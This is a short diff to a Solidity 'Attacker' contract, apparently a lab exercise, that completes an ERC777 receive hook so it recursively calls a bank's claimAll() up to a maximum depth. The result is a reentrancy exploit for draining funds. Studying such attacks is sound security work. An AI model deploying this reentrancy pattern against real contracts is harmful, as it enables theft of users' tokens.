@@ -42,8 +42,8 @@ contract Attacker is AccessControl, IERC777Recipient {
 			
       if(depth < max_depth){
         depth ++;
-	emit Recurse(depth);
         bank.claimAll();
+        emit Recurse(depth);
       }
       
     
@@ -71,7 +71,11 @@ contract Attacker is AccessControl, IERC777Recipient {
 	) external {
 		//YOUR CODE TO RECURSE GOES HERE
 	    require(msg.sender == address(bank.token()), "Invalid token");
+
+    if (depth < max_depth) {
+        depth++;
+        bank.claimAll();
+    }
 	}
 
 }
-
